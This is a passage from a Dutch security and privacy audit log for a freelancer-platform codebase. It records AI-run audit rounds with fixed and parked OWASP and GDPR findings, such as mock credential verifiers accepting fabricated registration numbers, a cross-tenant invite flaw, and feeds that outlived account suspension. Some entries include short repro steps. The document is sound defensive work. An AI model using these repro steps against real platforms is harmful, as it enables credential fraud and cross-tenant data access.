  (`description` = eigen vrije tekst, `netCents`/`vatCents`/`category`/`occurredAt`), maar
  `src/lib/account-export.ts` bevatte géén `expense`-sectie — een FREELANCER die zijn eigen data
  opvraagt kreeg zijn zakelijke uitgaven (incl. eigen omschrijvingen) niet terug, terwijl het platform
  dit wél als zijn persoonsgegeven/administratie behandelt. Repro: boek een uitgave "Lunch met klant X" →
  vraag de AVG-inzage-export op → vóór de fix ontbrak de uitgave volledig. Gefixt: smalle, op `userId`
  gescopete `db.expense.findMany`-sectie toegevoegd (`description`/`category`/`netCents`/`vatCents`/
  `occurredAt`/`createdAt`; interne grootboek-id's blijven eruit). Test: nieuwe case in
  `src/lib/account-export.test.ts` (sectie present, op de actor gescopet, geen interne id — rood→groen:
  zonder de sectie faalt de present-assertie en gooit de fake-db op de ontbrekende `expense`-tabel).

### Geparkeerd / herbevestigd (deze ronde geverifieerd nog steeds open)

- **[MIDDEL→OPGELOST (verificatie 2e ronde 2026-07-08) · AVG art. 15/20 — inzage-export mist enkele
  erased-maar-niet-geëxporteerde velden]** ~~Naast `Expense` mist `account-export.ts` nog
  `ShiftHandoff.reason`/`decisionNote`, `AvailabilityWindow.note`, `Collaboration.disputeReason`,
  CLIENT-`Application.note`.~~ **Gecorrigeerd:** in de 2e ronde in code geverifieerd dat alle vier de
  velden inmiddels aanwezig én correct op de actor gescoped zijn in `account-export.ts` (commit
  `620f926`, PR #677); zie ook de "OPGELOST 2026-07-08"-entry lager in dit bestand. Deze regel bleef
  per abuis als "open" staan (documenthygiëne, CLAUDE.md regel 6) — hierbij gesloten.
- **[MIDDEL→OPGELOST · OWASP A04/A09 (+ AVG art. 32) — `/api/billing/webhook` heeft geen rate-limit]**
  Publieke, ongeauthenticeerde webhook deed per ping een uitgaande Mollie/Stripe-call
  (`provider.paymentStatus`) voor een aanvaller-gestuurd id — geen forgeable state-change (server
  her-verifieert + matcht op `providerRef`), maar een ongelimiteerde outbound-oracle/kostenamplificatie
  (+ een DB-lookup per ping). Gefixt: nieuwe IP-gekeyde `billingWebhookRateLimiter` (spiegel
  `cspReportRateLimiter`, default 60/min/IP via `BILLING_WEBHOOK_RATE_LIMIT`) als eerste stap in de
  POST-handler — vóór de body-read, de provider-referentie-resolutie én de DB-lookup. Bij overschrijding
  bewust **200** (geen 429): een 429 zou de provider tot een retry-storm aanzetten en throttle-info
  lekken; de drempel ligt ruim boven een legitieme provider-burst (retries lopen met backoff) zodat een
  echte webhook niet gemist wordt. Tests: `src/app/api/billing/webhook/route.test.ts` (6 cases —
  flood→200+géén provider/DB-werk, IP-keying via x-forwarded-for/x-real-ip, doorlaat→resolutie,
  paid→activatie+audit, geen sub→geen provider-call). Rood→groen: zonder de poort vuurt de provider-call
  ongelimiteerd.
- **[MIDDEL · AVG art. 30 (+5/6) — publieke reviewer-naam niet in register — MENSENWERK]** Herbevestigd:
  `src/components/profile/profile-screen.tsx:219,524` toont de echte `author.name` van een review op de
  publieke, niet-ingelogde `/zzp/[id]`; geen register-entry voor deze openbaarmaking van een derde.
  Productbeslissing (register-entry+grondslag vs. alleen voornaam/initialen vs. opt-in) → eerst mens
  (FG/eigenaar, MENSENWERK §5), daarna kleine patch.
- **[LAAG · AVG art. 5(1e)/17 vs. fiscale bewaargrond — `Expense.description` niet geredigeerd bij
  anonimisering — MENSENWERK]** `Expense` wordt bij `anonymizeUser` niet aangeraakt (spiegelt het bewuste
  `Invoice`-fiscale-bewaarplicht-precedent). Waarschijnlijk consistente, bewuste architectuur — maar
  moet een expliciete DPO-beslissing zijn (redigeren zoals `ShiftHandoff`, óf expliciet onder de
  7-jaars-fiscale-uitzondering houden en dat in het register benoemen), geen stille agent-fix.
- **[LAAG · body-read-parity — `/api/client-error` + `/api/csp-report` lezen de body vóór de
  grootte-check]** `request.text()` leest de volledige body in geheugen vóór `MAX_BODY_BYTES`; beide
  routes zijn IP-rate-limited + upstream begrensd. Bestaand geaccepteerd patroon (niet nieuw). Aanbevolen:
  vroege `Content-Length`-afwijzing op beide routes.

## Ronde 2026-07-07 (2e — basis: `main` @ ab6bc99)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) alle 39 `src/app/api/**/route.ts` route handlers, (2) alle `"use server"`
action-bestanden + gedeelde authz/tenancy/cascade-helpers, (3) volledige AVG/privacy-sweep
(anonimisering/export/dataminimalisatie/k-anonimiteit/register/retentie/derden), (4) cross-cutting
injectie/SSRF/redirect/secrets/headers/auth/deps (`npm audit`). Kader: OWASP Top 10 (A01/A03/A04/A09)

- ASVS + AVG art. 5/6/15/17/30. `npm audit --production`: **0 kwetsbaarheden** (dev-only: esbuild GHSA-
  g7r4-m6w7-qqqr LAAG, js-yaml GHSA-h67p-54hq-rp68 MIDDEL — buiten de productie-tree). Next 15.5.19 (voorbij
  CVE-2025-29927 middleware-bypass), next-auth 5.0.0-beta.31, Prisma 6.19.3 — geen toepasselijke CVE's.
  **Eén KRITIEKE bevinding volledig gefixt (rood→groen); vijf lager-prioritaire geparkeerd (hieronder).**

### OPGELOST in deze ronde

- **[KRITIEK→OPGELOST · OWASP A04 (insecure design) + kerndifferentiatie-verificatieflow — de
  ingebouwde demo-verifiers stempelden op productie een verzonnen-maar-format-geldig diploma/BIG-nummer/
  identiteit stil als "Geverifieerd", wat de plaatsingspoort opent]** In de standaardconfiguratie geven
  `getDiplomaVerifier`/`getBigVerifier`/`getIdentityVerifier` de `Mock*`-verifier terug (`source: "MOCK"`)
  tenzij `DIPLOMA_VERIFIER=duo` / `BIG_VERIFIER=bigregister` / `IDENTITY_VERIFIER=idin` expliciet is gezet.
  De mocks controleren **alleen het formaat** (BIG = 11 cijfers, DUO-code-patroon, naam-match) en geven
  dan `verified:true`. De zelf-verificatie-acties (`verifyCredentialViaDuo`/`verifyCredentialViaBig` in
  `src/app/(protected)/certificaten/actions.ts`, `verifyIdentity` in `src/app/(protected)/account/actions.ts`)
  zetten het resultaat direct op `VERIFIED` — het hoogste vertrouwenssignaal — zónder admin-tussenkomst.
  `computeCompliance`/`complianceBlocksPlacement` behandelt `Credential.status === "VERIFIED"` als
  grondwaarheid en laat op grond daarvan het tekenen van een contract voor een BIG-/diploma-plichtige
  (zorg)opdracht toe (Wkkgz-relevant). **Repro:** een FREELANCER uploadt een willekeurige PDF als
  "Licentie", roept `verifyCredentialViaBig(id, {bigNumber:"12345678901"})` aan → op een productie-deploy
  zónder echte BIG-koppeling werd de credential VERIFIED en passeerde de plaatsingspoort — een neppe
  beroepsregistratie. Er bestond **geen code-level fail-closed poort**; de mock draaide silent-by-omission.
  **Gefixt:** nieuwe pure poort `src/lib/services/verification-policy.ts` (`isMockVerificationAllowed` /
  `mockVerificationBlocked`): buiten productie én bij `SEED_DEMO=true` (expliciete demo-dataset) én bij
  `ALLOW_MOCK_VERIFICATION=true` (bewuste pilot-opt-in) is de mock toegestaan; op een échte productie-
  deploy (geen demo, geen opt-in) wordt een `source:"MOCK"`-resultaat **geweigerd** (fail-closed) — de
  drie acties stempelen niets, auditen de geweigerde poging (`CREDENTIAL_VERIFY_BLOCKED` /
  `IDENTITY_VERIFY_BLOCKED`) en sturen de gebruiker naar de handmatige admin-verificatiequeue (de
  gezonde vertrouwensroute blijft). Echte registerresultaten (`source !== "MOCK"`) passeren altijd. `env.ts`
  kent nu `ALLOW_MOCK_VERIFICATION`/`SEED_DEMO` + een productie-`envWarnings` die luid meldt dat zelf-
  verificatie GEBLOKKEERD is (of, bij opt-in, dat verzonnen credentials geverifieerd kunnen worden). Rule 8
  gerespecteerd: **geen boot-break** — het is een runtime-actiepoort + waarschuwing, geen harde env-eis.
  Tests: `src/lib/services/verification-policy.test.ts` (11 pure cases), `verify-failclosed.test.ts`
  (integratie: geen `$transaction`/VERIFIED-schrijf in productie, wél bij SEED_DEMO/dev — rood→groen: zonder
  de poort stempelt de actie VERIFIED op een mock-resultaat), + 3 nieuwe `env.test.ts`-cases. **GO-LIVE:
  zet de echte koppelingen (`=duo`/`=bigregister`/`=idin`) vóór echte diploma-/VOG-data live gaat.**

### Geparkeerd (deze ronde gevonden, nog niet gefixt)

- **[HOOG · AVG art. 30/5/6 — Lead/prospect-PII buiten register, geen bewaartermijn, geen wis-pad]**
  `model Lead`/`LeadContact` (`prisma/schema.prisma`) bewaart `contactName`/`email`/`phone`/`notes`/`body`
  van externe opdrachtgever-prospects (géén platform-`User`). Deze verwerking staat **niet** in
  `PROCESSING_REGISTER`, heeft **geen** `RETENTION_SCHEDULE`-regel en `src/app/(protected)/franchise/leads/
actions.ts` kent **geen delete/erase-actie** — indefinite retentie, geen grondslag vastgelegd. Fix:
  register-entry ("Lead-acquisitie", grondslag GERECHTVAARDIGD_BELANG) + retentieregel + tenant-gescopede
  `deleteLead`-actie (auth→rol FRANCHISER→`assertSameTenant`→cascade delete→audit) + wis-UI-knop.
- **[MIDDEL · AVG art. 15/20 — inzage-export onvolledig]** `src/lib/account-export.ts` mist zelf-geschreven
  PII die `anonymizeUser` wél als wisbaar behandelt: `ShiftHandoff.reason`/`decisionNote`,
  `AvailabilityWindow.note`, `Collaboration.disputeReason` (eigen), `LeadContact.body` (als FRANCHISER),
  en CLIENT-geschreven `Application.note` (de `applications`-query is op `freelancer.userId` gescoped → voor
  een CLIENT-actor leeg). Fix: die secties toevoegen met eigen-data-scoping.
- **[MIDDEL · OWASP A04/A09 — `/api/billing/webhook` heeft geen rate-limit]** `src/app/api/billing/webhook/
route.ts` is publiek (geen auth) en doet per ping een uitgaande Mollie-API-call (`provider.paymentStatus`)
  voor een aanvaller-gestuurd `id`. Geen forgeable state-change (server her-verifieert bij Mollie + matcht op
  bestaande `providerRef`), maar wél een ongelimiteerde outbound-oracle/kostenamplificatie — anders dan
  `csp-report`/`agenda/feed.ics` die wél `enforceRateLimit` hebben. Fix: IP-gekeyde rate-limiter (bv. nieuwe
  `billingWebhookRateLimiter`) vóór de provider-call.
- **[MIDDEL · AVG art. 30/5 — publieke reviewer-naam niet in register]** `src/components/profile/
profile-screen.tsx` toont de echte `author.name` van een review op de publieke, niet-ingelogde `/zzp/[id]`.
  Geen register-entry voor deze openbaarmaking van een derde (de reviewer). Fix: register-entry
  "Beoordelingen (publiek)" + grondslag, of alleen voornaam/initialen tonen, of opt-in bij indienen.
- **[LAAG · rate-limiter fail-open bij Upstash-storing]** `src/lib/rate-limit.ts:162-192` (`consume`) geeft
  bij een Redis-fout `allowed:true` (bewuste "beschikbaarheid > limiet"-keuze). Autorisatie faalt nooit open —
  alleen de throttle — en de ID's zijn `cuid()` (niet enumereerbaar). Menselijke afweging of dit acceptabel is.

_De vier geparkeerde items uit de 1e ronde van 2026-07-07 (Lead-vrije-tekst-derden, retentie-purge-taak,
Geoapify-register, IBAN-register) blijven eveneens open; zie hieronder._

## Ronde 2026-07-07 (1e — basis: `main` @ 3f6cda5)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) alle 39 `src/app/api/**/route.ts` route handlers, (2) alle 46 `"use server"`
action-bestanden + de gedeelde authz/tenancy/enums/audit-helpers, (3) een volledige AVG/privacy-sweep
(anonimisering/verwijdering, inzage-export, dataminimalisatie, k-anonimiteit, verwerkingsregister,
logs, retentie, derde-partijen). Kader: OWASP Top 10 (A01 broken access control/IDOR/cross-tenant, A03
injection, A04 insecure design, A09 logging) + OWASP ASVS + AVG art. 5/15/17/30. `npm audit` schoon (0
kwetsbaarheden). Zelf onafhankelijk geverifieerd schoon (geen nieuwe gaten): de delta sinds de vorige
ronde (`d4b6039..3f6cda5`, #638–#644 — reiskosten/mileage, factuur-herhalen, opdracht-sluit-notificatie,
S3 SSE-at-rest, ontwerpconcepten); alle export-CSV's escapen formule-injectie (`escapeCsvField`); cron-
routes zijn `timingSafeEqual`-secret-gated; de billing-webhook her-verifieert de status server-side bij
Mollie; wachtwoord-reset (gehashte tokens, 1u TTL, atomair eenmalig gebruik, enumeratiebescherming, rate-
limited); CSP met nonce+strict-dynamic; login hardcode-redirect (geen open redirect). **Eén KRITIEKE
bevinding volledig gefixt (rood→groen); vier lager-prioritaire geparkeerd (hieronder).**

### OPGELOST in deze ronde

- **[KRITIEK→OPGELOST · OWASP A09 (logging) + AVG art. 17 (recht op vergetelheid) — `anonymizeUser`
  scrubde de auditlog-metadata niet, waardoor het rauwe e-mailadres (en IP/user-agent) van de betrokkene
  de anonimisering overleefde]** `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`)
  overschrijft `User.email`/`name` en redacteert tientallen vrije-tekstvelden, maar raakte **geen enkele
  bestaande `AuditLog`-rij** aan. Vier schrijfpunten zetten het rauwe e-mailadres in `AuditLog.metadata`
  (JSON-string): `src/auth.ts:81` (`AUTH_RATE_LIMITED`) en `:97` (`USER_LOGIN_FAILED`),
  `src/app/register/actions.ts:45` (`REGISTER_RATE_LIMITED`), `src/app/(protected)/admin/import/actions.ts:285`
  (`USER_IMPORTED`). Daarnaast staan het IP-adres en de user-agent (beide persoonsgegeven) op de eigen
  auditregels van de betrokkene. Repro: een gebruiker logt ooit fout in / registreert / wordt geïmporteerd,
  wordt later op eigen verzoek geanonimiseerd → een `SELECT * FROM AuditLog WHERE entityId = '<userId>'`
  (of het admin-dossier `src/lib/admin-user-detail.ts`, dat audit-metadata tóónt) levert nog steeds het
  originele e-mailadres + IP op — de betrokkene blijft herleidbaar ondanks "geanonimiseerd", precies wat
  art. 17 moet voorkomen. Gefixt: pure helper `scrubAuditMetadataEmail` (exact, hoofdletter-ongevoelig
  matchend — geen substring-lek naar de auditregel van een ander) + `anonymizeUser` zoekt nu élke
  auditregel die aan de betrokkene raakt (eigen `actorId`/`entityId`, of het originele e-mailadres in de
  metadata) en redact e-mail uit de metadata + wist IP/user-agent, atomair binnen dezelfde anonimiserings-
  transactie. Tests: `src/lib/account-anonymization.test.ts` (6 pure cases incl. substring-niet-raken +
  hoofdletter-ongevoeligheid) en `src/app/(protected)/admin/gebruikers/anonymize-erasure.test.ts` (3 nieuwe
  cases: e-mail eruit/IP eruit op login-failed, rol-behoud+e-mail-redact op import, IP+UA-wis op eigen
  actie, en de auditregel-van-een-ander wordt NIET geraakt — rood→groen: zonder de fix ontbreken de
  `auditLog.update`-ops volledig).

### Geparkeerd (deze ronde gevonden, nog niet gefixt)

- **[HOOG · AVG art. 17 — vrije tekst van dérden óver de betrokkene overleeft anonimisering]**
  `src/app/(protected)/admin/gebruikers/actions.ts` redacteert bewust NIET: `NoShowReport.reason` (door de
  melder over déze ZZP'er geschreven, regel ~114), en analoog `Review.comment` waar de betrokkene
  `subjectId` is (alleen `authorId`-reviews worden gewist) en `ShiftHandoff.decisionNote`/`reason` van de
  tegenpartij. Na anonimisering kan zo'n record nog steeds de naam/identificerende details van de
  "verwijderde gebruiker" tonen. Bewuste architectuurkeuze met reëel PII-risico → **eerst door mens (FG/
  eigenaar, MENSENWERK.md §5) laten beoordelen** vóór er echte VOG/diploma-houders op productie staan; zo
  niet acceptabel, redacteren met een bewaargrond-uitzondering alleen bij een lopend geschil (zoals al bij
  `disputeReason` gebeurt).
- **[MIDDEL · AVG art. 5 lid 1e (opslagbeperking) — bewaartermijnen niet technisch afgedwongen]**
  `src/lib/compliance/processing-register.ts` (`RETENTION_SCHEDULE`) claimt termijnen (AuditLog 12 mnd,
  berichten 12 mnd na samenwerking, reacties 4 wk na selectie), maar `src/app/api/tasks/run-all/route.ts`
  bevat géén purge/cleanup-taak voor `AuditLog`/`Message`/`Application` — data blijft feitelijk onbeperkt.
  Fix: een scheduled retentie-taak toevoegen die deze regels afdwingt, of het register bijstellen naar de
  werkelijke praktijk (nu is het register misleidend).
- **[MIDDEL · AVG art. 30 — verwerkingsregister mist reistijd-routing + derde-partij Geoapify]**
  `src/lib/services/routing.ts` stuurt locatiegegevens (plaats/adres uit `FreelancerProfile.location`/
  `Job.location`) naar `api.geoapify.com` (extern, mogelijk niet-EER), maar
  `src/lib/compliance/processing-register.ts` noemt deze verwerking/ontvanger nergens (in tegenstelling tot
  DUO/BIG/iDIN/e-mail, die wél met SCC-taal zijn opgenomen). Fix: activiteit + verwerker/doorgifte-
  beoordeling (SCC's indien niet-EER) toevoegen. NB: routing staat default op `offline` (inert) — alleen
  relevant zodra `ROUTING_PROVIDER=geoapify`.
- **[LAAG · AVG art. 30 — register noemt niet-bestaand gegevenstype]**
  `src/lib/compliance/processing-register.ts` vermeldt "Bankgegevens (IBAN)" bij facturatie, maar
  `prisma/schema.prisma` bevat geen IBAN/bankgegevensveld. Fix: verwijderen of expliciet als
  "toekomstig/nog niet geïmplementeerd" markeren.

## Ronde 2026-07-06 (2e — basis: `main` @ d4b6039)

Audit: orchestrator (Opus 4.8) + 1 parallelle adversariële Opus security-subagent op de vérse delta
sinds de vorige ronde (`a5abe5a..d4b6039`, #631–#637): de nieuwe **upload-malware-scan-seam**
(`services/upload-scanner.ts`, ClamAV achter env-flag, #631), de **betaalreputatie-spiegel** voor de
opdrachtgever (`data/payment-behavior.ts` + `client-payment-reputation.ts`, #632), de **passende open
diensten op het ZZP'er-dossier** (franchise, `franchise/dienst-suggesties.ts`, #634) en de proactieve
**urencriterium-herinnering** (`hours-criterion-reminder(-task).ts`, #636). Kader: OWASP Top 10 (A01
broken access control/IDOR/cross-tenant, A04 insecure design, A03 injection, A09 logging) + OWASP ASVS +
AVG art. 5/17/30. Zelf onafhankelijk geverifieerd schoon: `dienst-suggesties`/`dienst-voordracht`/
`roster-dossier` (overal `tenantScopeWhere(actor)`; de audit-log-idempotentie-lookups zijn transitief
tenant-gescopet via reeds-gecheckte `jobId`), de betaalreputatie-spiegel (alleen aggregaten, `actor.id`-
gescopet, geen cross-party-lek), `hours-criterion-reminder-task` (geen PII in logs, entitlement-gated,
mutatie+audit+notificatie in één `$transaction`), de clamd INSTREAM-parser (`interpretClamAvResponse`:
found-vóór-clean, geankerde single-line-match, fail-closed default). **Twee bevindingen volledig gefixt
(rood→groen).**

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · OWASP A01 (broken access control — stale server-side status + cross-tenant) +
  CLAUDE.md regel 1 + tenant-isolatie (`lib/tenancy.ts`) + AVG art. 17 — publieke vertrouwensdossier-
  deelpagina dwong geen account-liveness of tenant-isolatie af]** De sessieloze, publieke deelpagina
  `/vertrouwen/[profileId]/[token]` (`src/app/vertrouwen/[profileId]/[token]/page.tsx`) is gepoort door
  een deterministisch, per-profiel onveranderlijk HMAC-deeltoken + `visibility === "PUBLIC"`, maar
  checkte — anders dan zijn sibling-viewer `/zzp/[id]` (`profile-screen.tsx`, die het expliciet dóét) en
  anders dan de één-commit-eerdere agenda-feed-fix (#630) — **noch** account-liveness (`status` /
  `anonymizedAt`) **noch** tenant-isolatie. Schorsing (`setUserStatus`) en anonimisering (`anonymizeUser`)
  raken `FreelancerProfile.visibility` niet, dus een geldig token overleeft de statuswijziging: de pagina
  bleef de **naam + alle VERIFIED-certificaten + de "Servergeverifieerd door ZZP Platform"-zegel**
  serveren voor een geschorst (bv. wegens fraude/valse VOG) of geanonimiseerd/gewist account — precies
  het scenario dat de kerndifferentiatie (geverifieerd vertrouwen) hoort te vóórkomen. Bovendien maakt
  `createZzper` (franchise) roster-ZZP'ers standaard met `visibility: "PUBLIC"` **én** `tenantId` gezet;
  hun vertrouwensdossier was zo over het hele publieke internet bereikbaar zónder enige tenant-grens,
  terwijl hetzelfde profiel op `/zzp/[id]` correct per tenant is afgeschermd (`tenantEntityVisibleTo`) —
  een cross-tenant-lek op een niet-verlopende bearer-URL. Repro: (1) ADMIN schorst/anonimiseert een
  FREELANCER → de eerder gedeelde `/vertrouwen/{id}/{token}`-link toont nog steeds het geverifieerde
  dossier; (2) een franchise-roster-ZZP'er (tenant-gebonden) → dossier publiek zonder tenant-check.
  Gefixt: liveness-poort (`status === "ACTIVE" && !anonymizedAt`) + tenant-poort (`tenantId === null` —
  de anonieme-viewer-reductie van `tenantEntityVisibleTo`) toegevoegd aan de `isShared`-gate, met
  `tenantId`/`status`/`anonymizedAt` in de `select`; neutrale "niet (meer) gedeeld"-melding blijft (geen
  informatielek). Test: `src/app/vertrouwen/vertrouwen-liveness.test.ts` (actief+PUBLIC+geen-tenant →
  audit/serve; geschorst/geanonimiseerd/tenant-gebonden/ongeldig-token → geen serve, geen audit —
  rood→groen bewezen: 3 cases falen zonder de poorten).

- **[MIDDEL→OPGELOST · OWASP A04 (insecure design) + CLAUDE.md regel 4 (upload-veiligheid) — company-
  logo-upload omzeilde de nieuwe malware-scanner]** #631 introduceerde `assertUploadClean` (fail-closed
  ClamAV-scan vóór opslag) en bedraadde die in de document- én certificaat-upload, maar **niet** in de
  derde stored-binary-upload-call-site: de company-logo-upload in `src/app/(protected)/bedrijf/actions.ts`
  (`updateCompanyProfile`). Die deed wél `validateUpload` + `assertContentMatchesMime`, maar geen
  malware-scan → wanneer een operator `UPLOAD_SCANNER=clamav` inschakelt (in de verwachting dat álle
  uploads gescand worden), belandde een besmet "logo" onbekeken in de opslag én werd het via
  `/api/media/[...key]` aan elke ingelogde gebruiker geserveerd. Geen live exploit (scanner default Noop;
  logo's zijn PDF/PNG/JPEG/WEBP met magic-byte-check + `nosniff` bij serve → geen SVG-stored-XSS), maar
  een reële completeness-gap die de fail-closed-intentie van #631 voor dít pad ondermijnt. Gefixt:
  `await assertUploadClean(buffer, { mimeType, size })` toegevoegd binnen de bestaande
  `UploadValidationError`-try/catch, identiek aan de twee zuster-call-sites. Test:
  `src/app/(protected)/bedrijf/actions.scan.test.ts` (schoon logo → scanner aangeroepen + `storage.put`;
  besmet logo → géén `storage.put` + fieldError — rood→groen bewezen: 2 cases falen zonder de regel).

### GEPARKEERD in deze ronde

- Geen nieuwe geparkeerde bevindingen. De onder "Ronde 2026-07-06 (1e)" en eerder geparkeerde LAAG-items
  (o.a. de Zod-grens op id-only-actions, self-export-audit, push-upsert-key) blijven staan.

## Ronde 2026-07-06 (basis: `main` @ a5abe5a)

Audit: orchestrator (Opus 4.8) + 2 parallelle Opus security-subagents op de vérse delta sinds de vorige
ronde (`944ee7c..a5abe5a`, #623–#629): de nieuwe **abonneerbare agenda-feed** (`/api/agenda/feed.ics`

- `calendar/feed-token.ts` + `user-schedule.ts`, #628), de **directe uitnodiging** (opdrachtgever →
  ZZP'er, `job-invite.ts` + `inviteFreelancerToJob`, #625), de **lead-pijplijn-samenvatting** (franchise,
  #627) en de nieuwe **CSP-violatie-ontvanger** (`/api/csp-report` + `observability/csp-report.ts`, #624).
  Kader: OWASP Top 10 (A01 broken access control/IDOR, A03 injection, A04 insecure design, A09 logging) +
  OWASP ASVS + AVG art. 5/17/30. Zelf onafhankelijk geverifieerd: CSP-report-endpoint (ongeauthenticeerd,
  maar rate-limited per IP, 16KB-bodylimiet, altijd 204, AGRESSIEF PII-genormaliseerd — document-URL → pad,
  bron-URL → origin, referrer/UA/original-policy weggegooid, `sample` afgekapt op 120 tekens; geen
  log-injectie-/DoS-/PII-vector); agenda-feed-token (128-bit HMAC-SHA256, namespace-gescheiden van het
  dossier-deeltoken, timing-safe + lengte-check verificatie); lead-pijplijn (read-only, `requireRole
("FRANCHISER")` + `tenantScopeWhere(actor)` — geen cross-tenant, alleen aggregaten, geen per-individu-PII
  onder de k-anon-drempel `LEAD_CONVERSION_MIN_SAMPLE`). **Twee bevindingen volledig gefixt (rood→groen);
  één LAAG geparkeerd.**

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · OWASP A01 (broken access control / cross-tenant IDOR) + CLAUDE.md regel 1 & 2 —
  `inviteFreelancerToJob` scopet de uitgenodigde ZZP'er niet op de tenant]** De nieuwe directe-
  uitnodiging (`src/app/(protected)/opdrachten/actions.ts`) deed correct auth → rol `CLIENT` → ownership
  van de ópdracht (`assertOwnership(actor, job.company.userId)`), maar zocht de uit te nodigen ZZP'er met
  **alleen** `discoverableFreelancerWhere` (`{ visibility: "PUBLIC", user: { status: "ACTIVE" } }`) —
  **zonder** `tenantId`-grens. `FreelancerProfile.visibility` staat standaard op `PUBLIC`, dus de query
  vond óók een ZZP'er uit de private roster van een ándere franchise. Élke andere consument van
  `discoverableFreelancerWhere` combineert 'm met de tenant (`suggestions.ts:306`:
  `{ ...discoverableFreelancerWhere, tenantId: job.tenantId }`, met de comment "anders lekt cross-tenant
  PII" — en dát is precies de functie die déze uitnodigingsknoppen voedt). Repro: een opdrachtgever in
  franchise-A (of een directe opdrachtgever, `tenantId: null`) roept de server action
  `inviteFreelancerToJob(eigenJobId, freelancerVanFranchiseB.id)` rechtstreeks aan → vóór de fix: een
  `Notification` naar die ZZP'er met bedrijfs-/opdrachtnaam van búiten zijn franchise + een `JOB_INVITED`-
  audit + een PII-join over de tenant-grens. De ownership-stap dekte de opdracht, niet de uitgenodigde
  (CLAUDE.md regel 2). Niet via de UI zichtbaar (die toont alleen tenant-gescopete suggesties), maar de
  server mag daar niet op leunen (regel 1: client toont, beslist niet). Gefixt: `tenantId: true` op de
  job-select + `tenantId: job.tenantId` op de freelancer-`where` (spiegelt `suggestions.ts` exact; een
  directe opdrachtgever bereikt zo alleen niet-tenant-ZZP'ers). Test: nieuwe case in
  `opdrachten/actions.test.ts` (`findFirst`-mock respecteert nu de tenant-`where`; franchise-B-ZZP'er →
  geen notificatie/audit — rood→groen bewezen).

- **[MIDDEL→OPGELOST · OWASP A01 + CLAUDE.md regel 1 (server-side status = waarheid) + AVG art. 17 —
  publieke agenda-feed dwong geen account-liveness af]** De nieuwe abonneerbare feed
  `GET /api/agenda/feed.ics` (#628) is bewust sessieloos (een externe agenda-app pollt 'm) en gepoort door
  een deterministisch, per-gebruiker onveranderlijk HMAC-token. Daardoor blijft een geldig token gelden
  ná schorsing of anonimisering: de feed serveerde het volledige werkrooster van de gebruiker — inclusief
  de **NAAM van de tegenpartij (derde-partij-PII)**, jobtitels en data — ook voor een geschorst (bv.
  wegens fraude/misbruik) of geanonimiseerd/gewist account. De sessie-export (`/api/agenda`) snijdt zo'n
  account wél live af via `currentActor()` (`status !== "ACTIVE"` of `anonymizedAt` → geen actor;
  `anonymizeUser` zet `status: "SUSPENDED"` + `anonymizedAt`), maar de publieke feed had die check niet.
  Repro: schors (of anonimiseer) een account met een actieve samenwerking → open de eerder gedeelde
  `feed.ics?u=…&t=…`-link → vóór de fix: 200 + rooster met tegenpartij-PII. Gefixt: een liveness-poort
  ná de tokenverificatie (`prisma.user.findUnique` → `!user || anonymizedAt || status !== "ACTIVE"` →
  404, vóór elke rooster-DB-I/O; 404 i.p.v. 403 zodat de respons niets over het bestaan/de status
  prijsgeeft — spiegelt `currentActor()`). Test: `src/app/api/agenda/feed-liveness.test.ts` (actief →
  200 + rooster; geschorst/geanonimiseerd/onbekend → 404 + géén rooster-load; ongeldig token → 404 vóór
  DB — rood→groen bewezen: 3 cases falen zonder de poort).

### GEPARKEERD in deze ronde

- **[LAAG · CLAUDE.md regel 2 (Zod-grens) — `inviteFreelancerToJob` valideert de twee id-inputs niet via
  Zod]** `jobId`/`freelancerProfileId` gaan rauw de `prisma.findUnique/findFirst` in (Prisma
  parametriseert → geen injectie; consistent met zuster-id-only-actions als `toggleSavedJob`/
  `changeJobStatus`). Geen exploit; puur consistentie met de "elke mutatie: Zod"-keten. Aanbevolen:
  triviale `z.string().cuid()`-guard voor defense-in-depth. Terugkerend thema (zie eerdere rondes:
  `saveApplicationNote`).

## Ronde 2026-07-05 (2e — basis: `main` @ 944ee7c)

Audit: orchestrator (Opus 4.8) + 3 parallelle Opus security-subagents op niet-overlappende
oppervlakken, gericht op de vérse code sinds de vorige ronde (opdrachtgever-betaal/crediteuren/
vacaturetempo-features #616–#621, cron-fout-reporting #615) — (1) IDOR/authz over ÁLLE 24
`src/app/api/**`-route-handlers (incl. cron-auth, document/media, dossier/PDF/export, billing-webhook,
push), (2) cross-tenant-isolatie over álle 12 franchise-server-actions + gedeelde tenant-scoped
data-laag, (3) cross-party-PII/dataminimalisatie/injectie op de non-admin/non-franchise mutatie-
oppervlakte + de nieuwe payment-obligations/creditor/vacancy-features + CSV-export-escaping. Kader:
OWASP Top 10 (A01 broken access control, A03 injection, A04 insecure design, A09 logging) + OWASP
ASVS + AVG art. 5/15/17/30. Zelf onafhankelijk geverifieerd: storage-abstractie (path-traversal-guard
`LocalStorageDriver.resolve` + magic-byte-sniff `sniffMimeType` + niet-raadbare `generateStorageKey`),
CSV formule-injectie-guard (`escapeCsvField`: neutraliseert `= + @ TAB CR` + niet-numerieke `-`),
push-SSRF-allowlist (`isAllowedPushEndpoint`), bulk-import mass-assignment (`assertImportRole` runtime-
gate + PII-gemaskeerde logs), `anonymizeUser`-erasure-volledigheid (uitputtend t.o.v. het schema),
geen server-side `fetch` met user-URL (geen SSRF-vector), `npm audit`: **0 prod-kwetsbaarheden**
(2 dev-only: js-yaml GHSA-h67p-54hq-rp68 — raakt de productie-bundel niet). **Geen KRITIEK/HOOG
gevonden** — de drie oppervlakken zijn goed gehard: elke ownership-gevoelige route/actie doet
auth→rol→ownership(DB-hercheck, nooit client-id vertrouwd)→Zod→actie→audit (op allow én deny); élke
duale/cross-tenant mutatie scopet béide resources op de server-side `Actor.tenantId`. Eén MIDDEL
defense-in-depth-hardening gefixt (rood→groen); rest geparkeerd (LAAG).

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · OWASP A01/A04 + CLAUDE.md regel 1 — `VerplichtingenPanel` had geen eigen
  rol-gate]** Het herbruikbare servercomponent `verplichtingen-panel.tsx` riep `getObligationItemsFor
Client(actor.id)` aan en toonde de betaalverplichtingen (crediteuren/facturen/bedragen) van een
  OPDRACHTGEVER zónder zelf `actor.role === "CLIENT"` te checken — het leunde vólledig op zijn twee
